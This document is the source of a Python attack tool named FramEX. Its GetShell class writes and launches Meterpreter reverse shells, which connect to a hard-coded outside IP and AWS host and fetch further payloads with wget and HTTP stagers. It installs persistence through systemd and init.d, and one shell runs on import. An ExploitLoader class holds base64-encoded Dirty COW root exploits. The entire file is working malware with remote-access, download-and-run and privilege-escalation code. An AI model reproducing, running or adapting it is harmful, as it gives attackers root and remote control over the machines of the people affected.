# FramEX Version 1.0

import os
import string 
import random
import subprocess

# PORTS =>
# 8192->linux_Meterpreter_reverseTcp
# 8194->python meterpreter_reverse_tcp  
# 8195->linux_Meterpreter_reverse_https 
# 8196->windows32_meterpreter_reverse_https
# 8197->python_meterpreter_reverse_http
# 8198->windows64_meterpreter_reverse_https


class GetShell:
    def __init__(self):
        print("\nGetting a Shell...")
        self.pwd = subprocess.check_output(['pwd'])
        self.pwd = self.pwd[:len(self.pwd)-1]
        os.system("rm -rf "+self.pwd+"/pyn.sh\nrm -rf "+self.pwd+"/pyns.sh\nrm -rf "+self.pwd+"/pyn.py\n")
        return 
######################################################
    def linux_python_ScriptCreate(self, payload, scriptname):
        f = open(self.pwd+"/"+scriptname+".py", "wb")
        f.write(payload)
        f.close()
        os.system("chmod +x "+self.pwd+"/"+scriptname+".py")
        s = subprocess.check_output(['which', 'python'])
        s = s[:len(s)-1]
        f = open(self.pwd+"/"+scriptname+".sh", "wb")
        s = "#!/bin/sh\nnohup " + s + " " + self.pwd+"/"+scriptname+".py &\n"
        f.write(s)
        f.close()
        os.system("chmod +x "+self.pwd+"/"+scriptname+".sh\nsh "+self.pwd+"/"+scriptname+".sh")
######################################################
    def linux_native_ScriptCreate(self, scriptname):
        os.system("chmod +x "+self.pwd+"/"+scriptname+"\nnohup "+self.pwd+"/"+scriptname+" &")
        f = open(self.pwd+"/"+scriptname+".sh", "wb")
        s = "#!/bin/sh\nnohup "+self.pwd+"/"+scriptname+" &"
        f.write(s)
        f.close()
        os.system("chmod +x "+self.pwd+"/"+scriptname+".sh")
######################################################
    def linux_native_binaryProcess(self, payload, scriptname, auto=False):
        f = open(self.pwd + "/"+scriptname+".o", "wb")
        f.write(payload)
        f.close()
        if auto:
            pl = self.python_AutomateWrapper(scriptname+".o", timer=30)
            self.linux_python_ScriptCreate(pl, scriptname)
            return pl
        else:
            self.linux_native_ScriptCreate(scriptname)
            return payload
######################################################
    def python_AutomateWrapper(self, scriptname, payload = None, python = False, timer=30): 
        # Generates a Python Payload Wrapper to automatically execute the payload every given seconds
        s = ""
        if python:
            pl = """import os,time\ns = '"""+payload.encode('hex')+"""'\nwhile True:\n\ttry:\n\t\texec(s.decode('hex'))\n\t\ttime.sleep("""+str(timer)+""")\n\texcept:\n\t\tprint("trying again")"""
            return pl
        else :
            if payload is not None:
                f = open(self.pwd+"/"+scriptname, "wb")
                f.write(payload)
                f.close()
        s = "chmod +x "+self.pwd+"/"+scriptname
        pl = """import os,time\nos.system(" """+s+""" ")\nwhile True:\n\ttry:\n\t\tos.system("./""" + scriptname + """")\n\t\ttime.sleep("""+str(timer)+""")\n\texcept:\n\t\tprint("trying again")"""
        return pl
######################################################
##################### Payloads #######################
######################################################
    def linuxPyAuto_reverseTcp(self):       # Tested
        i8192 = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\xf9\x00\x00\x00\x00\x00\x00\x00z\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H1\xffj\tX\x99\xb6\x10H\x89\xd6M1\xc9j"AZ\xb2\x07\x0f\x05H\x85\xc0xRj\nAYVPj)X\x99j\x02_j\x01^\x0f\x05H\x85\xc0x;H\x97H\xb9\x02\x00 \x00\r\xe8\xc2oQH\x89\xe6j\x10Zj*X\x0f\x05YH\x85\xc0y%I\xff\xc9t\x18Wj#Xj\x00j\x05H\x89\xe7H1\xf6\x0f\x05YY_H\x85\xc0y\xc7j<Xj\x01_\x0f\x05^Z\x0f\x05H\x85\xc0x\xef\xff\xe6'
        self.linux_native_binaryProcess(i8192, "pyns", auto=True)   # Automated By Python Wrapper
######################################################
    def linuxNative_reverseTcp(self):
        i8192 = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\xf9\x00\x00\x00\x00\x00\x00\x00z\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H1\xffj\tX\x99\xb6\x10H\x89\xd6M1\xc9j"AZ\xb2\x07\x0f\x05H\x85\xc0xRj\nAYVPj)X\x99j\x02_j\x01^\x0f\x05H\x85\xc0x;H\x97H\xb9\x02\x00 \x00\r\xe8\xc2oQH\x89\xe6j\x10Zj*X\x0f\x05YH\x85\xc0y%I\xff\xc9t\x18Wj#Xj\x00j\x05H\x89\xe7H1\xf6\x0f\x05YY_H\x85\xc0y\xc7j<Xj\x01_\x0f\x05^Z\x0f\x05H\x85\xc0x\xef\xff\xe6'
        self.linux_native_binaryProcess(i8192, "pyns", auto=False)  # Pure Binary
######################################################
    def python_meterpreter_reverseTcp(self):    # Already Automated, Tested
        i8194 = "import socket,struct,time\no = 5\nwhile True:\n\twhile True:\n\t\ttry:\n\t\t\ts=socket.socket(2,socket.SOCK_STREAM)\n\t\t\ts.connect(('13.232.194.111',8194))\n\t\t\tbreak\n\t\texcept:\n\t\t\ttime.sleep(o)\n\tl=struct.unpack('>I',s.recv(4))[0]\n\td=s.recv(l)\n\twhile len(d)<l:\n\t\td+=s.recv(l-len(d))\n\texec(d,{'s':s})\n\to = 50\n\ttime.sleep(o)"
        self.linux_python_ScriptCreate(i8194, "pyn")
######################################################
    def python_meterpreter_reverseHttp(self):        # Tested
        i8197 = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJ10pCmhzPVtdCm89dWwuYnVpbGRfb3BlbmVyKCpocykKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJyldCmV4ZWMoby5vcGVuKCdodHRwOi8vMTMuMjMyLjE5NC4xMTE6ODE5Ny80dWU0SjhrWUxpNHV1RHVzZGRtN1BnT1RETDdiX20yMDhNeEN5YkFtbDBrV0g5UzEzX1liNWp3WFVwJykucmVhZCgpKQo=')))"
        i8197 = self.python_AutomateWrapper("_pynh.py", payload = i8197, python=True, timer=30)
        self.linux_python_ScriptCreate(i8197, "pynh")
######################################################
    def windows64_meterpreter_reverseHttps(self):
        os.system("wget 'ec2-13-232-194-111.ap-south-1.compute.amazonaws.com/fifa64.exe'")
######################################################
    def windows32_meterpreter_reverseHttps(self):
        os.system("wget 'ec2-13-232-194-111.ap-south-1.compute.amazonaws.com/fifa32.exe'")
######################################################
    def linux64_meterpreter_reverseHttps(self):     # Tested
        os.system("wget 'ec2-13-232-194-111.ap-south-1.compute.amazonaws.com/linux64.o' -O pynlh")
        self.linux_native_ScriptCreate("pynlh")
######################################################
    def setPersistance(self, scriptname):
        try:
            f = open("/lib/systemd/system/"+scriptname+".service", "wb")   # Python Reverse Meterpreter shell
            s = "[Unit]\nDescription=Something Special Again\nType=idle\n\n[Service]\nExecStart="+self.pwd+"/"+scriptname+".sh\n\n[Install]\nWantedBy=multi-user.target"
            f.write(s)
            f.close()
        except:
            print("")
        os.system("cp "+self.pwd+"/"+scriptname+".sh /etc/init.d/\nupdate-rc.d "+scriptname+".sh defaults\nservice "+scriptname+".sh start") 
        return   
######################################################
    def set_onStartup(self):
        self.setPersistance('pyn')
        self.setPersistance('pynh')
        self.setPersistance('pyns')
        self.setPersistance('pynlh')
######################################################
    def defaultBackdoors(self):
        self.linuxPyAuto_reverseTcp()
        self.linuxNative_reverseTcp()
        self.linux64_meterpreter_reverseHttps()
        self.python_meterpreter_reverseTcp()
        self.python_meterpreter_reverseHttp()
        self.windows64_meterpreter_reverseHttps()
        self.windows32_meterpreter_reverseHttps()

s = GetShell()
s.linuxNative_reverseTcp()

class ExploitLoader:
    def __init__(self):
        self.exs = []
        self.exps = {}
        print("\nTrying Default builtin Dirty Cow attacks...")
        # initializing some default PoCs
        # Dirty Cow PoCs -->
        dc0 = 'LyoKKgoqIEVEQi1Ob3RlOiBBZnRlciBnZXR0aW5nIGEgc2hlbGwsIGRvaW5nICJlY2hvIDAgPiAv\ncHJvYy9zeXMvdm0vZGlydHlfd3JpdGViYWNrX2NlbnRpc2VjcyIgbWF5IG1ha2UgdGhlIHN5c3Rl\nbSBtb3JlIHN0YWJsZS4KKgoqICh1biljb21tZW50IGNvcnJlY3QgcGF5bG9hZCBmaXJzdCAoeDg2\nIG9yIHg2NCkhCiogCiogJCBnY2MgY293cm9vdC5jIC1vIGNvd3Jvb3QgLXB0aHJlYWQKKiAkIC4v\nY293cm9vdAoqIERpcnR5Q293IHJvb3QgcHJpdmlsZWdlIGVzY2FsYXRpb24KKiBCYWNraW5nIHVw\nIC91c3IvYmluL3Bhc3N3ZC4uIHRvIC90bXAvYmFrCiogU2l6ZSBvZiBiaW5hcnk6IDU3MDQ4Ciog\nUmFjaW5nLCB0aGlzIG1heSB0YWtlIGEgd2hpbGUuLgoqIC91c3IvYmluL3Bhc3N3ZCBpcyBvdmVy\nd3JpdHRlbgoqIFBvcHBpbmcgcm9vdCBzaGVsbC4KKiBEb24ndCBmb3JnZXQgdG8gcmVzdG9yZSAv\ndG1wL2JhawoqIHRocmVhZCBzdG9wcGVkCiogdGhyZWFkIHN0b3BwZWQKKiByb290QGJveDovcm9v\ndC9jb3cjIGlkCiogdWlkPTAocm9vdCkgZ2lkPTEwMDAoZm9vKSBncm91cHM9MTAwMChmb28pCiov\nCgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8c3lzL21t\nYW4uaD4KI2luY2x1ZGUgPGZjbnRsLmg+CiNpbmNsdWRlIDxwdGhyZWFkLmg+CiNpbmNsdWRlIDxz\ndHJpbmcuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKdm9pZCAqbWFwOwppbnQgZjsKaW50IHN0b3Ag\nPSAwOwpzdHJ1Y3Qgc3RhdCBzdDsKY2hhciAqbmFtZTsKcHRocmVhZF90IHB0aDEscHRoMixwdGgz\nOwoKLy8gY2hhbmdlIGlmIG5vIHBlcm1pc3Npb25zIHRvIHJlYWQKY2hhciBzdWlkX2JpbmFyeVtd\nID0gIi91c3IvYmluL3Bhc3N3ZCI7CgovKgoqICQgbXNmdmVub20gLXAgbGludXgveDY0L2V4ZWMg\nQ01EPS9iaW4vYmFzaCBQcmVwZW5kU2V0dWlkPVRydWUgLWYgZWxmIHwgeHhkIC1pCiovIAp1bnNp\nZ25lZCBjaGFyIHNjW10gPSB7CiAgMHg3ZiwgMHg0NSwgMHg0YywgMHg0NiwgMHgwMiwgMHgwMSwg\nMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwKICAweDAwLCAweDAwLCAweDAwLCAw\neDAwLCAweDAyLCAweDAwLCAweDNlLCAweDAwLCAweDAxLCAweDAwLCAweDAwLCAweDAwLAogIDB4\nNzgsIDB4MDAsIDB4NDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4NDAsIDB4MDAs\nIDB4MDAsIDB4MDAsCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg\nMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwKICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAw\neDQwLCAweDAwLCAweDM4LCAweDAwLCAweDAxLCAweDAwLCAweDAwLCAweDAwLAogIDB4MDAsIDB4\nMDAsIDB4MDAsIDB4MDAsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDcsIDB4MDAsIDB4MDAs\nIDB4MDAsCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwg\nMHgwMCwgMHgwMCwgMHg0MCwgMHgwMCwKICAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAw\neDAwLCAweDQwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLAogIDB4YjEsIDB4MDAsIDB4\nMDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4ZWEsIDB4MDAsIDB4MDAsIDB4MDAs\nCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgxMCwgMHgwMCwgMHgwMCwgMHgwMCwg\nMHgwMCwgMHgwMCwgMHgwMCwKICAweDQ4LCAweDMxLCAweGZmLCAweDZhLCAweDY5LCAweDU4LCAw\neDBmLCAweDA1LCAweDZhLCAweDNiLCAweDU4LCAweDk5LAogIDB4NDgsIDB4YmIsIDB4MmYsIDB4\nNjIsIDB4NjksIDB4NmUsIDB4MmYsIDB4NzMsIDB4NjgsIDB4MDAsIDB4NTMsIDB4NDgsCiAgMHg4\nOSwgMHhlNywgMHg2OCwgMHgyZCwgMHg2MywgMHgwMCwgMHgwMCwgMHg0OCwgMHg4OSwgMHhlNiwg\nMHg1MiwgMHhlOCwKICAweDBhLCAweDAwLCAweDAwLCAweDAwLCAweDJmLCAweDYyLCAweDY5LCAw\neDZlLCAweDJmLCAweDYyLCAweDYxLCAweDczLAogIDB4NjgsIDB4MDAsIDB4NTYsIDB4NTcsIDB4\nNDgsIDB4ODksIDB4ZTYsIDB4MGYsIDB4MDUKfTsKdW5zaWduZWQgaW50IHNjX2xlbiA9IDE3NzsK\nCi8qCiogJCBtc2Z2ZW5vbSAtcCBsaW51eC94ODYvZXhlYyBDTUQ9L2Jpbi9iYXNoIFByZXBlbmRT\nZXR1aWQ9VHJ1ZSAtZiBlbGYgfCB4eGQgLWkKdW5zaWduZWQgY2hhciBzY1tdID0gewogIDB4N2Ys\nIDB4NDUsIDB4NGMsIDB4NDYsIDB4MDEsIDB4MDEsIDB4MDEsIDB4MDAsIDB4MDAsIDB4MDAsIDB4\nMDAsIDB4MDAsCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMiwgMHgwMCwgMHgwMywgMHgw\nMCwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwKICAweDU0LCAweDgwLCAweDA0LCAweDA4LCAweDM0\nLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDAwLAogIDB4MDAsIDB4MDAs\nIDB4MDAsIDB4MDAsIDB4MzQsIDB4MDAsIDB4MjAsIDB4MDAsIDB4MDEsIDB4MDAsIDB4MDAsIDB4\nMDAsCiAgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMCwgMHgwMSwgMHgwMCwgMHgwMCwgMHgwMCwgMHgw\nMCwgMHgwMCwgMHgwMCwgMHgwMCwKICAweDAwLCAweDgwLCAweDA0LCAweDA4LCAweDAwLCAweDgw\nLCAweDA0LCAweDA4LCAweDg4LCAweDAwLCAweDAwLCAweDAwLAogIDB4YmMsIDB4MDAsIDB4MDAs\nIDB4MDAsIDB4MDcsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MTAsIDB4MDAsIDB4MDAsCiAg\nMHgzMSwgMHhkYiwgMHg2YSwgMHgxNywgMHg1OCwgMHhjZCwgMHg4MCwgMHg2YSwgMHgwYiwgMHg1\nOCwgMHg5OSwgMHg1MiwKICAweDY2LCAweDY4LCAweDJkLCAweDYzLCAweDg5LCAweGU3LCAweDY4\nLCAweDJmLCAweDczLCAweDY4LCAweDAwLCAweDY4LAogIDB4MmYsIDB4NjIsIDB4NjksIDB4NmUs\nIDB4ODksIDB4ZTMsIDB4NTIsIDB4ZTgsIDB4MGEsIDB4MDAsIDB4MDAsIDB4MDAsCiAgMHgyZiwg\nMHg2MiwgMHg2OSwgMHg2ZSwgMHgyZiwgMHg2MiwgMHg2MSwgMHg3MywgMHg2OCwgMHgwMCwgMHg1\nNywgMHg1MywKICAweDg5LCAweGUxLCAweGNkLCAweDgwCn07CnVuc2lnbmVkIGludCBzY19sZW4g\nPSAxMzY7CiovCgp2b2lkICptYWR2aXNlVGhyZWFkKHZvaWQgKmFyZykKewogICAgY2hhciAqc3Ry\nOwogICAgc3RyPShjaGFyKilhcmc7CiAgICBpbnQgaSxjPTA7CiAgICBmb3IoaT0wO2k8MTAwMDAw\nMCAmJiAhc3RvcDtpKyspIHsKICAgICAgICBjKz1tYWR2aXNlKG1hcCwxMDAsTUFEVl9ET05UTkVF\nRCk7CiAgICB9CiAgICBwcmludGYoInRocmVhZCBzdG9wcGVkXG4iKTsKfQoKdm9pZCAqcHJvY3Nl\nbGZtZW1UaHJlYWQodm9pZCAqYXJnKQp7CiAgICBjaGFyICpzdHI7CiAgICBzdHI9KGNoYXIqKWFy\nZzsKICAgIGludCBmPW9wZW4oIi9wcm9jL3NlbGYvbWVtIixPX1JEV1IpOwogICAgaW50IGksYz0w\nOwogICAgZm9yKGk9MDtpPDEwMDAwMDAgJiYgIXN0b3A7aSsrKSB7CiAgICAgICAgbHNlZWsoZixt\nYXAsU0VFS19TRVQpOwogICAgICAgIGMrPXdyaXRlKGYsIHN0ciwgc2NfbGVuKTsKICAgIH0KICAg\nIHByaW50ZigidGhyZWFkIHN0b3BwZWRcbiIpOwp9Cgp2b2lkICp3YWl0Rm9yV3JpdGUodm9pZCAq\nYXJnKSB7CiAgICBjaGFyIGJ1ZltzY19sZW5dOwoKICAgIGZvcig7OykgewogICAgICAgIEZJTEUg\nKmZwID0gZm9wZW4oc3VpZF9iaW5hcnksICJyYiIpOwoKICAgICAgICBmcmVhZChidWYsIHNjX2xl\nbiwgMSwgZnApOwoKICAgICAgICBpZihtZW1jbXAoYnVmLCBzYywgc2NfbGVuKSA9PSAwKSB7CiAg\nICAgICAgICAgIHByaW50ZigiJXMgaXMgb3ZlcndyaXR0ZW5cbiIsIHN1aWRfYmluYXJ5KTsKICAg\nICAgICAgICAgYnJlYWs7CiAgICAgICAgfQoKICAgICAgICBmY2xvc2UoZnApOwogICAgICAgIHNs\nZWVwKDEpOwogICAgfQoKICAgIHN0b3AgPSAxOwoKICAgIHByaW50ZigiUG9wcGluZyByb290IHNo\nZWxsLlxuIik7CiAgICBwcmludGYoIkRvbid0IGZvcmdldCB0byByZXN0b3JlIC90bXAvYmFrXG4i\nKTsKCiAgICBzeXN0ZW0oc3VpZF9iaW5hcnkpOwp9CgppbnQgbWFpbihpbnQgYXJnYyxjaGFyICph\ncmd2W10pIHsKICAgIGNoYXIgKmJhY2t1cDsKCiAgICBwcmludGYoIkRpcnR5Q293IHJvb3QgcHJp\ndmlsZWdlIGVzY2FsYXRpb25cbiIpOwogICAgcHJpbnRmKCJCYWNraW5nIHVwICVzLi4gdG8gL3Rt\ncC9iYWtcbiIsIHN1aWRfYmluYXJ5KTsKCiAgICBhc3ByaW50ZigmYmFja3VwLCAiY3AgJXMgL3Rt\ncC9iYWsiLCBzdWlkX2JpbmFyeSk7CiAgICBzeXN0ZW0oYmFja3VwKTsKCiAgICBmID0gb3Blbihz\ndWlkX2JpbmFyeSxPX1JET05MWSk7CiAgICBmc3RhdChmLCZzdCk7CgogICAgcHJpbnRmKCJTaXpl\nIG9mIGJpbmFyeTogJWRcbiIsIHN0LnN0X3NpemUpOwoKICAgIGNoYXIgcGF5bG9hZFtzdC5zdF9z\naXplXTsKICAgIG1lbXNldChwYXlsb2FkLCAweDkwLCBzdC5zdF9zaXplKTsKICAgIG1lbWNweShw\nYXlsb2FkLCBzYywgc2NfbGVuKzEpOwoKICAgIG1hcCA9IG1tYXAoTlVMTCxzdC5zdF9zaXplLFBS\nT1RfUkVBRCxNQVBfUFJJVkFURSxmLDApOwoKICAgIHByaW50ZigiUmFjaW5nLCB0aGlzIG1heSB0\nYWtlIGEgd2hpbGUuLlxuIik7CgogICAgcHRocmVhZF9jcmVhdGUoJnB0aDEsIE5VTEwsICZtYWR2\naXNlVGhyZWFkLCBzdWlkX2JpbmFyeSk7CiAgICBwdGhyZWFkX2NyZWF0ZSgmcHRoMiwgTlVMTCwg\nJnByb2NzZWxmbWVtVGhyZWFkLCBwYXlsb2FkKTsKICAgIHB0aHJlYWRfY3JlYXRlKCZwdGgzLCBO\nVUxMLCAmd2FpdEZvcldyaXRlLCBOVUxMKTsKCiAgICBwdGhyZWFkX2pvaW4ocHRoMywgTlVMTCk7\nCgogICAgcmV0dXJuIDA7Cn0KCg==\n'
        self.exps['dc0'] = [dc0, self.dc0Compile]
        self.exs.append('dc0')      # Default 
        dc1 = 'LyoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIGRpcnR5YzB3LmMgIyMjIyMjIyMjIyMjIyMjIyMj\nIyMjIyMNCiQgc3VkbyAtcw0KIyBlY2hvIHRoaXMgaXMgbm90IGEgdGVzdCA+IGZvbw0KIyBjaG1v\nZCAwNDA0IGZvbw0KJCBscyAtbGFoIGZvbw0KLXItLS0tLXItLSAxIHJvb3Qgcm9vdCAxOSBPY3Qg\nMjAgMTU6MjMgZm9vDQokIGNhdCBmb28NCnRoaXMgaXMgbm90IGEgdGVzdA0KJCBnY2MgLXB0aHJl\nYWQgZGlydHljMHcuYyAtbyBkaXJ0eWMwdw0KJCAuL2RpcnR5YzB3IGZvbyBtMDAwMDAwMDAwMDAw\nMDAwMDANCm1tYXAgNTYxMjMwMDANCm1hZHZpc2UgMA0KcHJvY3NlbGZtZW0gMTgwMDAwMDAwMA0K\nJCBjYXQgZm9vDQptMDAwMDAwMDAwMDAwMDAwMDANCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIGRp\ncnR5YzB3LmMgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiovDQojaW5jbHVkZSA8c3RkaW8uaD4N\nCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KI2luY2x1ZGUgPGZjbnRsLmg+DQojaW5jbHVkZSA8cHRo\ncmVhZC5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5j\nbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3RkaW50Lmg+DQoNCnZvaWQgKm1hcDsNCmludCBm\nOw0Kc3RydWN0IHN0YXQgc3Q7DQpjaGFyICpuYW1lOw0KIA0Kdm9pZCAqbWFkdmlzZVRocmVhZCh2\nb2lkICphcmcpDQp7DQogIGNoYXIgKnN0cjsNCiAgc3RyPShjaGFyKilhcmc7DQogIGludCBpLGM9\nMDsNCiAgZm9yKGk9MDtpPDEwMDAwMDAwMDtpKyspDQogIHsNCi8qDQpZb3UgaGF2ZSB0byByYWNl\nIG1hZHZpc2UoTUFEVl9ET05UTkVFRCkgOjogaHR0cHM6Ly9hY2Nlc3MucmVkaGF0LmNvbS9zZWN1\ncml0eS92dWxuZXJhYmlsaXRpZXMvMjcwNjY2MQ0KPiBUaGlzIGlzIGFjaGlldmVkIGJ5IHJhY2lu\nZyB0aGUgbWFkdmlzZShNQURWX0RPTlRORUVEKSBzeXN0ZW0gY2FsbA0KPiB3aGlsZSBoYXZpbmcg\ndGhlIHBhZ2Ugb2YgdGhlIGV4ZWN1dGFibGUgbW1hcHBlZCBpbiBtZW1vcnkuDQoqLw0KICAgIGMr\nPW1hZHZpc2UobWFwLDEwMCxNQURWX0RPTlRORUVEKTsNCiAgfQ0KICBwcmludGYoIm1hZHZpc2Ug\nJWRcblxuIixjKTsNCn0NCiANCnZvaWQgKnByb2NzZWxmbWVtVGhyZWFkKHZvaWQgKmFyZykNCnsN\nCiAgY2hhciAqc3RyOw0KICBzdHI9KGNoYXIqKWFyZzsNCi8qDQpZb3UgaGF2ZSB0byB3cml0ZSB0\nbyAvcHJvYy9zZWxmL21lbSA6OiBodHRwczovL2J1Z3ppbGxhLnJlZGhhdC5jb20vc2hvd19idWcu\nY2dpP2lkPTEzODQzNDQjYzE2DQo+ICBUaGUgaW4gdGhlIHdpbGQgZXhwbG9pdCB3ZSBhcmUgYXdh\ncmUgb2YgZG9lc24ndCB3b3JrIG9uIFJlZCBIYXQNCj4gIEVudGVycHJpc2UgTGludXggNSBhbmQg\nNiBvdXQgb2YgdGhlIGJveCBiZWNhdXNlIG9uIG9uZSBzaWRlIG9mDQo+ICB0aGUgcmFjZSBpdCB3\ncml0ZXMgdG8gL3Byb2Mvc2VsZi9tZW0sIGJ1dCAvcHJvYy9zZWxmL21lbSBpcyBub3QNCj4gIHdy\naXRhYmxlIG9uIFJlZCBIYXQgRW50ZXJwcmlzZSBMaW51eCA1IGFuZCA2Lg0KKi8NCiAgaW50IGY9\nb3BlbigiL3Byb2Mvc2VsZi9tZW0iLE9fUkRXUik7DQogIGludCBpLGM9MDsNCiAgZm9yKGk9MDtp\nPDEwMDAwMDAwMDtpKyspIHsNCi8qDQpZb3UgaGF2ZSB0byByZXNldCB0aGUgZmlsZSBwb2ludGVy\nIHRvIHRoZSBtZW1vcnkgcG9zaXRpb24uDQoqLw0KICAgIGxzZWVrKGYsKHVpbnRwdHJfdCkgbWFw\nLFNFRUtfU0VUKTsNCiAgICBjKz13cml0ZShmLHN0cixzdHJsZW4oc3RyKSk7DQogIH0NCiAgcHJp\nbnRmKCJwcm9jc2VsZm1lbSAlZFxuXG4iLCBjKTsNCn0NCiANCiANCmludCBtYWluKGludCBhcmdj\nLGNoYXIgKmFyZ3ZbXSkNCnsNCi8qDQpZb3UgaGF2ZSB0byBwYXNzIHR3byBhcmd1bWVudHMuIEZp\nbGUgYW5kIENvbnRlbnRzLg0KKi8NCiAgaWYgKGFyZ2M8Mykgew0KICAodm9pZClmcHJpbnRmKHN0\nZGVyciwgIiVzXG4iLA0KICAgICAgInVzYWdlOiBkaXJ0eWMwdyB0YXJnZXRfZmlsZSBuZXdfY29u\ndGVudCIpOw0KICByZXR1cm4gMTsgfQ0KICBwdGhyZWFkX3QgcHRoMSxwdGgyOw0KLyoNCllvdSBo\nYXZlIHRvIG9wZW4gdGhlIGZpbGUgaW4gcmVhZCBvbmx5IG1vZGUuDQoqLw0KICBmPW9wZW4oYXJn\ndlsxXSxPX1JET05MWSk7DQogIGZzdGF0KGYsJnN0KTsNCiAgbmFtZT1hcmd2WzFdOw0KLyoNCllv\ndSBoYXZlIHRvIHVzZSBNQVBfUFJJVkFURSBmb3IgY29weS1vbi13cml0ZSBtYXBwaW5nLg0KPiBD\ncmVhdGUgYSBwcml2YXRlIGNvcHktb24td3JpdGUgbWFwcGluZy4gIFVwZGF0ZXMgdG8gdGhlDQo+\nIG1hcHBpbmcgYXJlIG5vdCB2aXNpYmxlIHRvIG90aGVyIHByb2Nlc3NlcyBtYXBwaW5nIHRoZSBz\nYW1lDQo+IGZpbGUsIGFuZCBhcmUgbm90IGNhcnJpZWQgdGhyb3VnaCB0byB0aGUgdW5kZXJseWlu\nZyBmaWxlLiAgSXQNCj4gaXMgdW5zcGVjaWZpZWQgd2hldGhlciBjaGFuZ2VzIG1hZGUgdG8gdGhl\nIGZpbGUgYWZ0ZXIgdGhlDQo+IG1tYXAoKSBjYWxsIGFyZSB2aXNpYmxlIGluIHRoZSBtYXBwZWQg\ncmVnaW9uLg0KKi8NCi8qDQpZb3UgaGF2ZSB0byBvcGVuIHdpdGggUFJPVF9SRUFELg0KKi8NCiAg\nbWFwPW1tYXAoTlVMTCxzdC5zdF9zaXplLFBST1RfUkVBRCxNQVBfUFJJVkFURSxmLDApOw0KICBw\ncmludGYoIm1tYXAgJXp4XG5cbiIsKHVpbnRwdHJfdCkgbWFwKTsNCi8qDQpZb3UgaGF2ZSB0byBk\nbyBpdCBvbiB0d28gdGhyZWFkcy4NCiovDQogIHB0aHJlYWRfY3JlYXRlKCZwdGgxLE5VTEwsbWFk\ndmlzZVRocmVhZCxhcmd2WzFdKTsNCiAgcHRocmVhZF9jcmVhdGUoJnB0aDIsTlVMTCxwcm9jc2Vs\nZm1lbVRocmVhZCxhcmd2WzJdKTsNCi8qDQpZb3UgaGF2ZSB0byB3YWl0IGZvciB0aGUgdGhyZWFk\ncyB0byBmaW5pc2guDQoqLw0KICBwdGhyZWFkX2pvaW4ocHRoMSxOVUxMKTsNCiAgcHRocmVhZF9q\nb2luKHB0aDIsTlVMTCk7DQogIHJldHVybiAwOw0KfQ==\n'
        self.exps['dc1'] = [dc1, self.defaultConfigCompile]
        self.exs.append('dc1')      
